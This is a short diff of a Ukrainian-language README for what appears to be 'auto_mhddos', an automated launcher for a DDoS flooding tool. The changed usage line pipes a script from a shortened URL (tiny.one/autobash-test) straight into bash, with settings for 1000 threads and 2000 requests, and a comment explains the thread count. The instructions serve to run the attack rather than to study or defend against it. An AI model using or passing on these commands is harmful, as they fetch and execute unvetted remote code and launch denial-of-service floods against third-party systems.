@@ -40,7 +40,7 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_b
 
 ## !Передача параметрів
 ```
-curl -L tiny.one/autobash-test | bash -s -- -t 50 -r 50 -k 1 --table | bash -s -- -t 1000 -r 2000 -k 1 --table
+curl -L tiny.one/autobash-test | bash -s -- -t 1000 -r 2000 -k 1 --table
 ```
 
 `-t 1000` - 1000 тредів
